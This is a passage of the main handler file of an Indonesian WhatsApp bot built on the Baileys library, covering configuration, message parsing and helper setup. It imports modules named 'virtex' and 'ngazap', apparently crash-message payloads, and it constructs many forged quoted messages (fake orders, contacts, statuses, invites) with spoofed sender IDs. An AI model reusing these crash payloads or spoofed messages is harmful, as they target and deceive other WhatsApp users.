// ๐พ๐ง๐๐๐ฉ๐๐ ๐ฝ๐ฎ ๐๐ฉ๐จ๐๐๐๐๐ก๐กใท๏ธ
// ๐๐๐ ๐๐จ๐๐ ๐๐ค๐ง๐ โป๏ธ
// ๐๐๐ญ๐๐๐ค๐ฃ๐ฏ ใ๏ธ
// ๐ผ๐ก๐๐ ๐๐๐ช๐ฏ๐ ใ๏ธ
// ๐๐ค๐๐๐๐ฌ ใ๏ธ
// ๐๐๐๐๐๐๐ผ๐๐ ใ๏ธ
// ๐๐๐ฎ๐ฏ๐๐ฃ 
// ๐ผ๐ฃ๐ ๐๐ฎ ๐๐๐ฉ๐ฃ๐๐ง & ๐๐๐ฃ๐ฎ๐๐๐๐ ๐ผ๐ฅ๐ ๐ฟ๐๐ฃ ๐๐ค๐๐ช๐ก 
// ๐๐๐ฟ ๐ผ๐๐ ๐พ๐๐๐ผ๐๐๐ ๐ฝ๐๐
const {
  WAConnection: _WAConnection,
  MessageType,
  Presence,
  MessageOptions,
  Mimetype,
  MimetypeMap,
  WALocationMessage,
  ChatModification,
  WA_MESSAGE_STUB_TYPES,
  WA_DEFAULT_EPHEMERAL,
  ReclientectMode,
  ProxyAgent,
  GroupSettingChange,
  waChatKey,
  mentionedJid,
  processTime,
} = require("@adiwajshing/baileys");
const simple = require("./lib/simple.js");
const { virtex, vipi } = require("./lib/virtex.js"); 
const { Toxic } = require('./lib/Toxic.js')
const hx = require("hxz-api");
const qrcode = require("qrcode-terminal");
const moment = require("moment-timezone");
const speed = require("performance-now");
const request = require("request");
const { spawn, exec, execSync } = require("child_process");
const fs = require("fs");
const axios = require("axios");
const ffmpeg = require("fluent-ffmpeg");
const { EmojiAPI } = require("emoji-api");
const ig = require("insta-fetcher");
const emoji = new EmojiAPI();
const fetch = require("node-fetch");
const FormData = require("form-data");
const phoneNum = require("awesome-phonenumber");
const gis = require("g-i-s");
const got = require("got");
const imageToBase64 = require("image-to-base64");
const ID3Writer = require("browser-id3-writer");
const crypto = require('crypto')
const brainly = require("brainly-scraper");
const yts = require("yt-search");
const ms = require("parse-ms");
const os = require('os');
const toMs = require("ms");
const { error } = require("qrcode-terminal");
const {
  getBuffer,
  h2k,
  generateMessageID,
  getGroupAdmins,
  getRandom,
  banner,
  start,
  info,
  success,
  close,
  simih,
} = require("./lib/functions");
const { color, bgcolor } = require("./lib/color");
const { virtex90 } = require('./virtex/virtex90')
const { virtex2 } = require('./virtex/virtex2')
const { virtex3 } = require('./virtex/virtex3')
const { virtex4 } = require('./virtex/virtex4')
const { virtex5 } = require('./virtex/virtex5')
const { virtex6 } = require('./virtex/virtex6')
const { virtex7 } = require('./virtex/virtex7')
const { virtex8 } = require('./virtex/virtex8')
const { virtex9 } = require('./virtex/virtex9')
const { ngazap } = require('./virtex/ngazap')
const { virtag } = require('./virtex/virtag')
const { emoji2 } = require('./virtex/emoji2')
const { fetchJson, getBase64, kyun, createExif } = require("./lib/fetcher");
const { yta, ytv, igdl, upload, formatDate } = require("./lib/ytdl");
const { webp2mp4File } = require("./lib/webp2mp4");
const time = moment().tz("Asia/Jakarta").format("HH:mm:ss");
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
const afk = JSON.parse(fs.readFileSync("./lib/off.json"));
const { sleep, isAfk, cekafk, addafk } = require("./lib/offline");
const { cmdadd } = require("./lib/totalcmd.js");
const voting = JSON.parse(fs.readFileSync("./lib/voting.json"));
const { uptotele, uploadFile, RESTfulAPI, uploadImages } = require('./lib/uploadimage');
const { addVote, delVote } = require("./lib/vote");
const reminder = require("./lib/reminder");
const { jadibot, stopjadibot, listjadibot } = require("./lib/jadibot");
const _reminder = JSON.parse(fs.readFileSync("./database/reminder.json"));
let _registered = JSON.parse(fs.readFileSync('./database/user/registered.json'))
let register = JSON.parse(fs.readFileSync('./database/user/registered.json'))
const { wikiSearch } = require('./lib/wiki.js')
const { herolist } = require('./lib/herolist.js')
const { herodetails } = require('./lib/herodetail.js')
const { mediafireDl } = require('./lib/mediafire.js')
const truth = JSON.parse(fs.readFileSync('./database/truth.json'))
const dare = JSON.parse(fs.readFileSync('./database/dare.json'))
// BATAS IMAGE FOLDER //
const iye = fs.readFileSync('./stik/thumb.jpeg')
const asw1 = 'https://f.top4top.io/p_2073p4mwa0.jpg'
const sip = fs.readFileSync('./stik/oksip.jpeg')
const bgg = fs.readFileSync('./stik/fake.jpeg')
//// Image ///
const time2 = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    if (time2 < "24:59:00") {
      var ucapanWaktu = "Selamat malam";
    }
    if (time2 < "19:00:00") {
      var ucapanWaktu = "Selamat senja๐";
    }
    if (time2 < "18:00:00") {
      var ucapanWaktu = "Selamat sore๐";
    }
    if (time2 < "15:00:00") {
      var ucapanWaktu = "Selamat siangโ๏ธ";
    }
    if (time2 < "11:00:00") {
      var ucapanWaktu = "Selamat pagi๐";
    }
    if (time2 < "05:00:00") {
      var ucapanWaktu = "Selamat malam๐";
    }
 // BATAS \\
menusimpel = false
banChats = true;
offline = false;
antidel = false;
welcom = false;
antical = false
readGc = true; 
readPc = true;
autovn = false;
multi = false
hitsmeval = 0
matauang = 'USD'
nopref = true
numbernye = '0'
autoketik = false;
prefixStatus = true;
targetpc = "6289626029135"; 
owner = "6289626029135"; 
fakeyoi = "Katashi ใท๏ธ"; 
HunterApi = "Ikyy69", 
xchillds = 'XChillDs' 
hardi = 'hardianto', 
valkey = "rivalgans", 
zeksapi = "vallganz5",
dapapi = "anakasu",
nomorowner1 = "@6289626029135"; 
fake = `๐ข๐๐ป๐ฒ๐ฟ : ${fakeyoi}\nใ๏ธ ๐ฃ๐ฟ๐ฒ๐ณ๐ถ๐ :ใ ${prefixStatus ? "Multi Prefix" : "No Prefix"} ใ`;
thumb = fs.readFileSync("./stik/thumb.jpeg"); 
numbernye = "0"; 
waktu = "-";
alasan = "-"; 
autojoin = false;
cmhit = []
hit_today = [];
//=================================================//
let _scommand = JSON.parse(fs.readFileSync("./database/scommand.json"));

// ๐๐๐ป๐ฐ๐ฎ๐๐ถ๐ผ๐ป ๐ฆ๐๐ถ๐ฐ๐ธ๐ฒ๐ฟ ๐๐ผ๐บ๐บ๐ฎ๐ป๐ฑ ใท๏ธ
const addCmd = (id, command) => {
  const obj = { id: id, chats: command };
  _scommand.push(obj);
  fs.writeFileSync("./database/scommand.json", JSON.stringify(_scommand));
};
const getCommandPosition = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return position;
  }
};

const getCmd = (id) => {
  let position = null;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      position = i;
    }
  });
  if (position !== null) {
    return _scommand[position].chats;
  }
};

const checkSCommand = (id) => {
  let status = false;
  Object.keys(_scommand).forEach((i) => {
    if (_scommand[i].id === id) {
      status = true;
    }
  });
  return status;
};
function monospace(string) {
return '```' + string + '```'
}   
const runtime = function (seconds) {
  seconds = Number(seconds);
  var d = Math.floor(seconds / (3600 * 24));
  var h = Math.floor((seconds % (3600 * 24)) / 3600);
  var m = Math.floor((seconds % 3600) / 60);
  var s = Math.floor(seconds % 60);
  var dDisplay = d > 0 ? d + (d == 1 ? " hari, " : " Hari, ") : "";
  var hDisplay = h > 0 ? h + (h == 1 ? " jam, " : " Jam, ") : "";
  var mDisplay = m > 0 ? m + (m == 1 ? " menit, " : " Menit, ") : "";
  var sDisplay = s > 0 ? s + (s == 1 ? " detik" : " Detik") : "";
  return dDisplay + hDisplay + mDisplay + sDisplay;
};
module.exports = itsmevall = async (itsmevall, mek) => {
  try {
    if (!mek.hasNewMessage) return;
    mek = mek.messages.all()[0];
    if (!mek.message) return;
    if (mek.key && mek.key.remoteJid == "status@broadcast") return;
    global.blocked;
    mek.message =
      Object.keys(mek.message)[0] === "ephemeralMessage"
        ? mek.message.ephemeralMessage.message
        : mek.message;
const typei = Object.keys(mek.message)[0]
const type = Object.keys(mek.message)[0]
let _chats =
      type === "conversation" && mek.message.conversation
        ? mek.message.conversation
        : type == "imageMessage" && mek.message.imageMessage.caption
        ? mek.message.imageMessage.caption
        : type == "videoMessage" && mek.message.videoMessage.caption
        ? mek.message.videoMessage.caption
        : type == "extendedTextMessage" && mek.message.extendedTextMessage.text
        ? mek.message.extendedTextMessage.text
        : type == "buttonsResponseMessage" && mek.message[type].selectedButtonId
        ? mek.message[type].selectedButtonId
        : type == "stickerMessage" &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== null &&
          getCmd(mek.message[type].fileSha256.toString("base64")) !== undefined
        ? getCmd(mek.message[type].fileSha256.toString("base64"))
        : "";
const isImage = (type === 'imageMessage')
const cmd = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('hex')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : "".slice(1).trim().split(/ +/).shift().toLowerCase()
if (multi){
		    var prefix = /^[ยฐzZ#$@*+,.?=''():โ%!ยขยฃยฅโฌฯยคฮ ฮฆ_&><`โขยฉยฎฮ^ฮฒฮฑยฆ|/\\ยฉ^]/.test(cmd) ? cmd.match(/^[ยฐzZ#$@*+,.?=''():โ%ยขยฃยฅโฌฯยคฮ ฮฆ_&><!`โขยฉยฎฮ^ฮฒฮฑยฆ|/\\ยฉ^]/gi) : '.'
        } else {
            if (nopref){
                prefix = ''
            } else {
                prefix = prefa
            }
        }
    const content = JSON.stringify(mek.message);
    const from = mek.key.remoteJid;
    const {
      text,
      extendedText,
      contact,
      location,
      contactsArray,
      liveLocation,
      image,
      video,
      sticker,
      document,
      audio,
      product,
    } = MessageType;
const body = (type === 'listResponseMessage' && mek.message.listResponseMessage.title) ? mek.message.listResponseMessage.title : (type === 'buttonsResponseMessage' && mek.message.buttonsResponseMessage.selectedButtonId) ? mek.message.buttonsResponseMessage.selectedButtonId : (type === 'conversation' && mek.message.conversation.startsWith(prefix)) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption.startsWith(prefix) ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption.startsWith(prefix) ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text.startsWith(prefix) ? mek.message.extendedTextMessage.text : (type == 'stickerMessage') && (getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== null && getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) !== undefined) ? getCmd(mek.message.stickerMessage.fileSha256.toString('base64')) : ""
		const budo = (typei === 'conversation') ? mek.message.conversation : (typei === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const budy = (type === 'conversation') ? mek.message.conversation : (type === 'extendedTextMessage') ? mek.message.extendedTextMessage.text : ''
		const command = body.replace(prefix, '').trim().split(/ +/).shift().toLowerCase()
		const args = body.trim().split(/ +/).slice(1)
		const isCmd = body.startsWith(prefix)
		const arg = budy.slice(command.length + 2, budy.length)
		const c = args.join(' ')
    const q = args.join(" ");
		var pes = (type === 'conversation' && mek.message.conversation) ? mek.message.conversation : (type == 'imageMessage') && mek.message.imageMessage.caption ? mek.message.imageMessage.caption : (type == 'videoMessage') && mek.message.videoMessage.caption ? mek.message.videoMessage.caption : (type == 'extendedTextMessage') && mek.message.extendedTextMessage.text ? mek.message.extendedTextMessage.text : ''
		const messagesD = pes.slice(0).trim().split(/ +/).shift().toLowerCase()
    const botNumber = itsmevall.user.jid;
    
    const botNumberss = itsmevall.user.jid + "@c.us";
    const isGroup = from.endsWith("@g.us");

    const antilink = JSON.parse(fs.readFileSync("./database/antilink.json"));
    const antivirtex = JSON.parse(
      fs.readFileSync("./database/antivirtex.json")
    );
    
    const kickarea = JSON.parse(fs.readFileSync("./database/antibule.json"));
    const nsfww = JSON.parse(fs.readFileSync('./database/nsfww.json'))
    const bancht = JSON.parse(fs.readFileSync('./database/banchat.json'));
    const antivo = JSON.parse(fs.readFileSync("./database/antivo.json"));
    const antihidetg = JSON.parse(
      fs.readFileSync("./database/antihidetag.json")
    );
    const isAntihidetag = isGroup ? antihidetg.includes(from) : false;
    const isAntiviewonce = isGroup ? antivo.includes(from) : false;
    const isKickarea = isGroup ? kickarea.includes(from) : false;
    const isNsfw = isGroup ? nsfww.includes(from) : false
    const isAntivirtex = isGroup ? antivirtex.includes(from) : false;
    const isAntilink = isGroup ? antilink.includes(from) : false;
// ๐ผ๐ช๐ฉ๐ค ๐๐๐๐ ๐๐
var ampun = await itsmevall.chats.array.filter(v => v.jid.endsWith('g.us'))
ampun.map( async ({ jid }) => {
if (readGc === false) return
await itsmevall.chatRead(jid)
})
// ๐ผ๐ช๐ฉ๐ค ๐๐๐๐ ๐๐
var chatss = await itsmevall.chats.array.filter(v => v.jid.endsWith('s.whatsapp.net'))
chatss.map( async ({ jid }) => {
if (readPc === false) return
await itsmevall.chatRead(jid)
})
// ๐ผ๐ช๐ฉ๐ค ๐๐ฃ:๐ซ
if (autovn) {
	if (autovn === false) return
await itsmevall.updatePresence(from, Presence.recording)
} else if (autoketik) {
	if (autoketik === false) return
await itsmevall.updatePresence(from, Presence.composing)
}
const createSerial = (size) => {
            return crypto.randomBytes(size).toString('hex').slice(0, size)
        }
const checkRegisteredUser = (sender) => {
            let status = false
            Object.keys(_registered).forEach((i) => {
                if (_registered[i].id === sender) {
                    status = true
                }
            })
            return status
        }
    const sender = mek.key.fromMe
      ? itsmevall.user.jid
      : isGroup
      ? mek.participant
      : mek.key.remoteJid;
    let senderr = mek.key.fromMe
      ? itsmevall.user.jid
      : mek.key.remoteJid.endsWith("@g.us")
      ? mek.participant
      : mek.key.remoteJid;
    const totalchat = await itsmevall.chats.all();
    const ownerNumber = [`6289626029135@s.whatsapp.net`]
	const senderNumber = sender.split("@")[0] 
    const m = simple.smsg(itsmevall, mek);
    const groupMetadata = isGroup ? await itsmevall.groupMetadata(from) : "";
    const groupName = isGroup ? groupMetadata.subject : "";
    const groupId = isGroup ? groupMetadata.jid : "";
    const itsMe = mek.key.fromMe ? true : false
    const isRegistered = checkRegisteredUser(sender)
   const isRegister = register.includes(sender)
    const groupMembers = isGroup ? groupMetadata.participants : "";
    const groupDesc = isGroup ? groupMetadata.desc : "";
    const isOwner = ownerNumber.includes(sender)
    const groupOwner = isGroup ? groupMetadata.owner : "";
    const hour_now = moment().format('HH:mm:ss')
    const groupAdmins = isGroup ? getGroupAdmins(groupMembers) : "";
    const isBotGroupAdmins = groupAdmins.includes(botNumber) || false;
    const isGroupAdmins = groupAdmins.includes(sender) || false;
    const isBanchat = isGroup ? bancht.includes(from) : false
    const isVote = isGroup ? voting.includes(from) : false;
    const conts = mek.key.fromMe
      ? itsmevall.user.jid
      : itsmevall.contacts[sender] || { notify: jid.replace(/@.+/, "") };
    const pushname = mek.key.fromMe
      ? itsmevall.user.name
      : conts.notify || conts.vname || conts.name || "-";
    const readmore = "ออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออออ";
    if (prefix && command) cmdadd();
    const totalhit = JSON.parse(fs.readFileSync("./lib/totalcmd.json"))[0]
      .totalcmd;
const daftar1 = `Hai kak  ${pushname} ${ucapanWaktu} \n\nSebelum Menggunakan Bot Verify Terlebih Dahulu Ya `
       const daftar2 = '```Ketik Tombol Di Bawah Untuk Verify Kak Atau Ketik 8473\n๐๐ณ๐ฆ๐ข๐ต๐ฆ๐ฅ ๐๐บ Katashi ใท๏ธ```'
       const daftar3 = [
          {
            buttonId: `verify`,
            buttonText: {
              displayText: `๐๐ข๐ง๐ต๐ข๐ณ ใท๏ธ`,
            },
            type: 1,
          },]
var hayuk0 = '[NOT VERIFIED]'
			if (isRegistered) {
			hayuk0 = '[โ VERIFIED]'
			}
    //Y
const timeWib = moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')
		const timeWita = moment().tz('Asia/Makassar').format('DD/MM HH:mm:ss')
        const timeWit = moment().tz('Asia/Jayapura').format('DD/MM HH:mm:ss')
    const time = moment.tz("Asia/Jakarta").format("DD/MM HH:mm:ss");
    const jam = moment().tz("Asia/Jakarta").format("HH:mm:ss");
    const wita = moment.tz("Asia/Makassar").format("HH:mm:ss");
    const wit = moment.tz("Asia/Jayapura").format("HH:mm:ss");
    let locale = "id";
    let d = new Date();
    let gmt = new Date(0).getTime() - new Date("1 January 1970").getTime();
    let weton = ["Pahing", "Pon", "Wage", "Kliwon", "Legi"][
      Math.floor((d * 1 + gmt) / 84600000) % 5
    ];
    let date = d.toLocaleDateString(locale, {
      day: "numeric",
      month: "long",
      year: "numeric",
    });
    let week = d.toLocaleDateString(locale, { weekday: "long" });
    let waktu = d.toLocaleDateString(locale, {
      hour: "numeric",
      minute: "numeric",
      second: "numeric",
    });
cmhit.push(command)
    //MESS
    mess = {
      wait: "๐๐๐๐ฉ ๐ผ ๐๐๐ฃ๐ช๐ฉ๐ ใท๏ธ",
      success: "๐๐ฒ๐ฟ๐ต๐ฎ๐๐ถ๐นใท๏ธ",
      wrongFormat: "Format salah, coba liat lagi di menu",
      error: {
        stick: "bukan sticker itu:v",
        apiz: "Nulisnya Jan Kepanjangan Erorkan",
        Iv: "Linknya error:v",
      },
      only: {
        group: "Khusus grup ngab",
      },
    };

    const isUrl = (url) => {
      return url.match(
        new RegExp(
          /https?:\/\/(www\.)?[-a-zA-Z0-9@:%.+~#=]{1,256}\.[a-zA-Z0-9()]{1,6}\b([-a-zA-Z0-9()@:%+.~#?&/=]*)/,
          "gi"
        )
      );
    };
  /*const reply = (teks) => {
      itsmevall.sendMessage(from, teks, text, { quoted: mek });
    };*/
    const textImg = (teks) => {
           return ikyy.sendMessage(from, teks, text, {quoted: freply, thumbnail: fs.readFileSync('./itsmevall.jpg')})
        }
const math = (teks) => {
           return Math.floor(teks)
       }
/*const reply = (teks) => {
			itsmevall.sendMessage(from, teks, text, { thumbnail: iye, sendEphemeral: true, quoted: mek, contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: `${jam} - ${week} ${weton} - ${date}`,body:"",previewType:"PHOTO",thumbnail:iye,sourceUrl:`https://wa.me/6281314050985?text=Assalamualaikum`}}})
		}*/
    const sendMess = (hehe, teks) => {
      itsmevall.sendMessage(hehe, teks, text);
    };

    const mentions = (teks, memberr, id) => {
      id == null || id == undefined || id == false
        ? itsmevall.sendMessage(from, teks.trim(), extendedText, {
            contextInfo: { mentionedJid: memberr },
          })
        : itsmevall.sendMessage(from, teks.trim(), extendedText, {
            quoted: mek,
            contextInfo: { mentionedJid: memberr },
          });
    };
// Fake Reply Bang:)
    const ftroli = {
      key: {
        fromMe: false,
        participant: "0@s.whatsapp.net",
        remoteJid: "629626029135-1604595598@g.us",
      },
      message: {
        orderMessage: {
          itemCount: 10,
          status: 200,
          thumbnail: iye,
          surface: 200,
          message: iye,
          orderTitle: "Katashi.",
          sellerJid: "0@s.whatsapp.net",
        },
      },
      contextInfo: { forwardingScore: 999, isForwarded: true },
      sendEphemeral: true,
    };
const freply = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '16504228206@s.whatsapp.net' } : {}) }, message: { "contactMessage": { "displayName": `${pushname}`, "vcard": `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${senderr.split('@')[0]}:${senderr.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, "jpegThumbnail":fs.readFileSync('./itsmevall.jpg')
        }}}
const freply7 = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: '1595603042@s.whatsapp.net' } : {}) }, message: { "productMessage":{"product": {"productImage": {"mimetype":'image/jpeg',"jpegThumbnail": iye, "title": `${ucapanWaktu} ${pushname}`, "productImageCount": 1 }, "businessOwnerJid": `0@s.whatsapp.net` }}}
}
 const fkontak = { 
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: `0@s.whatsapp.net` } : {}) }, message: { 'contactMessage': { 'displayName': `${pushname}`, 'vcard': `BEGIN:VCARD\nVERSION:3.0\nN:XL;${pushname},;;;\nFN:${pushname},\nitem1.TEL;waid=${sender.split('@')[0]}:${sender.split('@')[0]}\nitem1.X-ABLabel:Ponsel\nEND:VCARD`, 'jpegThumbnail': fs.readFileSync('./stik/thumb.jpeg')}}}
            //FAKE STICKER
            const fsticker = {
                  key: {fromMe: false,participant: `0@s.whatsapp.net`, ...(from ? { remoteJid: "16505434800@s.whatsapp.net" } : {})},"message": {"stickerMessage": { "url": "https://mmg.whatsapp.net/d/f/Am6FBfNf-E2f1VoGBXkPamek7L6Tw_HMavKrHEt48QM4.enc","fileSha256": "Yfj8SW7liSEnDakvyVlXVZQ1LJBC9idn09X7KHe8HTc=","fileEncSha256": "F854aUrzgAkBTOVULpne4oSIi6S04Jo56pjZEo+p+9U=","mediaKey": "Z3nA2asclAAwWHngNO/vJ81qxOE2/0gkEnXak+NxPV4=","mimetype": "image/webp","height": 64,"width": 64,"directPath": "/v/t62.15575-24/12097272_1193895144391295_8973688483514349023_n.enc?ccb=11-4&oh=5a9d7147627a8355569f1a641b9ebee3&oe=60C65E73","fileLength": "7186","mediaKeyTimestamp": "1622815545","isAnimated": false}}}
            //FAKE VN
const ftrol = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: iye, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const ftroli2 = {
	key : {
                          participant : '0@s.whatsapp.net'
                        },
       message: {
                    orderMessage: {
                            itemCount : 123,
                            status: 1,
                            surface : 1,
                            message: `${ucapanWaktu} ${pushname}`, //Kasih namalu
                            orderTitle: `${ucapanWaktu} ${pushname}`,
                            thumbnail: fake, //Gambarnye
                            sellerJid: '0@s.whatsapp.net' 
                          }
                        }
                      }
const finv = {
	"key": {
		"fromMe": false,
		"participant": "0@s.whatsapp.net",
		"remoteJid": "0@s.whatsapp.net"
	},
	"message": {
		"groupInviteMessage": {
			"groupJid": "629626029135-1616169743@g.us",
			"inviteCode": `${ucapanWaktu} ${pushname}`,
			"groupName": `${ucapanWaktu} ${pushname}`, 
            "caption": `${ucapanWaktu} ${pushname}`, 
            'jpegThumbnail': fake
		}
	}
}
    const fdoc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { documentMessage: { title: fake, jpegThumbnail: thumb } },
    };
    const fvn = {
      key: {
        participant: `16505434800@s.whatsapp.net`,
        ...(from ? { remoteJid: "629626029135-1613049930@g.us" } : {}),
      },
      message: {
        audioMessage: {
          mimetype: "audio/ogg; codecs=opus",
          seconds: 999999,
          ptt: "true",
        },
      },
    };
    const fgif = {
      key: {
        participant: `0@s.whatsapp.net`,
        ...(from ? { remoteJid: "629626029135-1613049930@g.us" } : {}),
      },
      message: {
        videoMessage: {
          title: fake,
          h: `Hmm`,
          seconds: "99999",
          gifPlayback: "true",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fstick = {
"key": {
	  "participant": `0@s.whatsapp.net`,
      "remoteJid": "629626029135-1613049930@g.us",
      "fromMe": false,
      "id": "3B64558B07848BD81108C1D14712018E"
    },
    "message": {
      "stickerMessage": {
        "fileSha256": "5b017c6ac1fb953c7bd21034d2fca5fad75ef2da4c3b2c2877ef49fa544e74bf",
		"pngThumbnail": iye,
	 "mimetype": "image/webp",
        "height": 64,
        "width": 64,
        "directPath": "/v/t62.15575-24/56110107_763365384384977_5720135628188301198_n.enc?oh=450f8f684b06f0ba2dbc9779e5f06774&oe=605B81EE",
        "fileLength": "0418",
        "firstFrameLength": 3626,
        "isAnimated": false
      }
    },
    "messageTimestamp": "1614070775",
    "status": "PENDING"
  }
// STICKER

    const fgclink = {
      key: { participant: "0@s.whatsapp.net", remoteJid: "0@s.whatsapp.net" },
      message: {
        groupInviteMessage: {
          groupJid: "629626029135-1616169743@g.us",
          inviteCode: "m",
          groupName: "P",
          caption: fake,
          jpegThumbnail: thumb,
        },
      },
    };
const fvid = {
	 key: { 
          fromMe: false,
	      participant: `629626029135@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "629626029135-1613049930@g.us" } : {}) 
                },
	 message: { 
                 "videoMessage": { 
                 "title": `${ucapanWaktu} ${pushname}`,
                 "h": `${ucapanWaktu} ${pushname}`,
                 'duration': '99999', 
                 'caption': `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
                       }
	                  }
const ftex = {
	 key: { 
          fromMe: false,
	      participant: `0@s.whatsapp.net`, ...(from ? 
	 { remoteJid: "629626029135-1613049930@g.us" } : {}) 
                },
	 message: { 
		"extendedTextMessage": {
                 "text": `${ucapanWaktu} ${pushname}`,
                 "title": `${ucapanWaktu} ${pushname}`,
                 'jpegThumbnail': iye
                        }
	                  } 
                     }
    const floc = {
      key: { participant: "0@s.whatsapp.net" },
      message: { locationMessage: { name: fake, jpegThumbnail: thumb } },
    };
    const fakestatus = (teks) => {
      itsmevall.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "status@broadcast" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const fakethumb = (teks, yes) => {
      itsmevall.sendMessage(from, teks, image, {
        thumbnail: fs.readFileSync("./stik/fake.jpeg"),
        quoted: mek,
        caption: yes,
      });
    };
    const fakegroup = (teks) => {
      itsmevall.sendMessage(from, teks, text, {
        quoted: {
          key: {
            fromMe: false,
            participant: `0@s.whatsapp.net`,
            ...(from ? { remoteJid: "6289523258649-1604595598@g.us" } : {}),
          },
          message: {
            imageMessage: {
              url: "https://mmg.whatsapp.net/d/f/At0x7ZdIvuicfjlf9oWS6A3AR9XPh0P-hZIVPLsI70nM.enc",
              mimetype: "image/jpeg",
              caption: fake,
              fileSha256: "+Ia+Dwib70Y1CWRMAP9QLJKjIJt54fKycOfB2OEZbTU=",
              fileLength: "28777",
              height: 1080,
              width: 1079,
              mediaKey: "vXmRR7ZUeDWjXy5iQk17TrowBzuwRya0errAFnXxbGc=",
              fileEncSha256: "sR9D2RS5JSifw49HeBADguI23fWDz1aZu4faWG/CyRY=",
              directPath:
                "/v/t62.7118-24/21427642_840952686474581_572788076332761430_n.enc?oh=3f57c1ba2fcab95f2c0bb475d72720ba&oe=602F3D69",
              mediaKeyTimestamp: "1610993486",
              jpegThumbnail: fs.readFileSync("./stik/thumb.jpeg"),
              scansSidecar:
                "1W0XhfaAcDwc7xh1R8lca6Qg/1bB4naFCSngM2LKO2NoP5RI7K+zLw==",
            },
          },
        },
      });
    };
    const sendStickerFromUrl = async (to, url) => {
      var names = Date.now() / 10000;
